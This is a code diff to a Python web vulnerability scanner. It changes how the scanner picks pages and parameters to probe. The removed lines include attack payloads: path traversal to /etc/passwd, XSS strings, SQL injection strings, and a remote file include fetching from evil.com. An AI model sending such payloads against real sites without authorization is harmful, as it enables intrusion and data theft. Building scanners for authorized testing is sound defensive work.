@@ -5003,7 +5003,7 @@ class VulnScanner:
         return results
     
     def _get_important_pages(self) -> List[str]:
-        """Get list of important pages dynamically"""
+        """Get list of important pages from path manager only"""
         # Get common paths from path manager
         common_paths = self.path_manager.generate_common_paths("")
         
@@ -5011,39 +5011,7 @@ class VulnScanner:
         for path_type, paths in common_paths.items():
             important_pages.extend(paths)
         
-        # Add dynamic parameter patterns for common vulnerabilities
-        param_patterns = [
-            '?cat=1', '?id=1', '?user=1', '?file=1', '?page=1',
-            '?artist=1', '?action=view', '?test=query', '?search=test',
-            '?name=admin', '?email=test@test.com', '?path=index',
-            '?include=header', '?template=main', '?lang=en',
-            '?redirect=home', '?url=http://example.com', '?callback=func'
-        ]
-        
-        # Combine base paths with parameters
-        base_paths = [
-            '/search.php', '/list.php', '/show.php', '/view.php',
-            '/listproducts.php', '/showimage.php', '/artists.php',
-            '/userinfo.php', '/categories.php', '/product.php',
-            '/details.php', '/profile.php', '/admin.php', '/login.php'
-        ]
-        for base_path in base_paths:
-            for param in param_patterns:
-                important_pages.append(base_path + param)
-        
-        # Add common vulnerable endpoints
-        vulnerable_endpoints = [
-            '/admin/index.php?page=../../../etc/passwd',
-            '/search.php?q=<script>alert(1)</script>',
-            '/login.php?redirect=javascript:alert(1)',
-            '/file.php?path=../../../../etc/passwd',
-            '/include.php?file=http://evil.com/shell.txt',
-            '/search.php?term=\' OR 1=1--',
-            '/user.php?id=1 UNION SELECT 1,2,3--'
-        ]
-        important_pages.extend(vulnerable_endpoints)
-        
-        return list(set(important_pages))[:150]  # Увеличиваем до 150 страниц для глубокого аудита
+        return list(set(important_pages))[:50]  # Limit to 50 pages from path manager
     
     def _get_success_indicators(self) -> List[str]:
         """Get indicators that suggest a request was successful"""
@@ -5093,7 +5061,7 @@ class VulnScanner:
         return normalized
     
     def _discover_common_parameters(self, url: str) -> Dict[str, List[str]]:
-        """Discover common parameters for any website"""
+        """Discover parameters from actual page content only"""
         common_params = {}
         
         # Try to get the main page and analyze it for forms and links
@@ -5106,9 +5074,11 @@ class VulnScanner:
                     for input_field in form.get('inputs', []):
                         param_name = input_field.get('name')
                         if param_name and param_name not in common_params:
-                            common_params[param_name] = ['test']
+                            # Use actual input value or 'test' as fallback
+                            param_value = input_field.get('value', 'test')
+                            common_params[param_name] = [param_value]
                 
-                # Extract parameters from links
+                # Extract parameters from links in the page
                 import re
                 param_patterns = re.findall(r'[?&]([^=]+)=([^&\s"\'<>]+)', response.text)
                 for param_name, param_value in param_patterns:
@@ -5117,48 +5087,40 @@ class VulnScanner:
         except:
             pass
         
-        # Add universal common parameters if none found
-        if not common_params:
-            common_params = {
-                'id': ['1'],
-                'page': ['1'], 
-                'cat': ['1'],
-                'user': ['1'],
-                'file': ['index'],
-                'search': ['test'],
-                'q': ['test']
-            }
-        
+        # Only return discovered parameters, don't add fake ones
         return common_params
     
     def _generate_dynamic_pages(self, base_url: str) -> List[str]:
-        """Generate dynamic pages based on common web patterns"""
+        """Generate dynamic pages based on discovered patterns only"""
         from urllib.parse import urlparse
         parsed = urlparse(base_url)
         base_path = parsed.path.rstrip('/')
         
-        # Common file patterns
-        common_files = [
-            'index.php', 'search.php', 'login.php', 'admin.php',
-            'user.php', 'profile.php', 'view.php', 'show.php',
-            'list.php', 'category.php', 'product.php', 'detail.php'
-        ]
+        # Only generate pages if we have a base path
+        if not base_path or base_path == '/':
+            return []
         
-        # Common parameter patterns
-        param_patterns = [
-            '?id=1', '?page=1', '?cat=1', '?user=1', '?file=index',
-            '?search=test', '?q=test', '?action=view', '?type=1'
-        ]
+        # Extract file extension from current URL
+        current_file = parsed.path.split('/')[-1] if '/' in parsed.path else ''
+        if '.' not in current_file:
+            return []
         
+        file_extension = '.' + current_file.split('.')[-1]
+        base_name = current_file.split('.')[0]
+        
+        # Generate similar files with same extension
         dynamic_pages = []
+        similar_names = [
+            'index', 'main', 'home', 'admin', 'login', 'search',
+            'list', 'view', 'show', 'edit', 'add', 'delete'
+        ]
         
-        # Generate combinations
-        for file in common_files:
-            for param in param_patterns:
-                page_url = f"{base_path}/{file}{param}"
+        for name in similar_names:
+            if name != base_name:  # Don't duplicate current file
+                page_url = f"{base_path}/{name}{file_extension}"
                 dynamic_pages.append(page_url)
         
-        return dynamic_pages[:50]  # Limit to 50 dynamic pages
+        return dynamic_pages[:20]  # Limit to 20 similar pages
     
     def _is_meaningful_404(self, response_text: str) -> bool:
         """Check if 404 response contains meaningful content that might indicate vulnerabilities"""
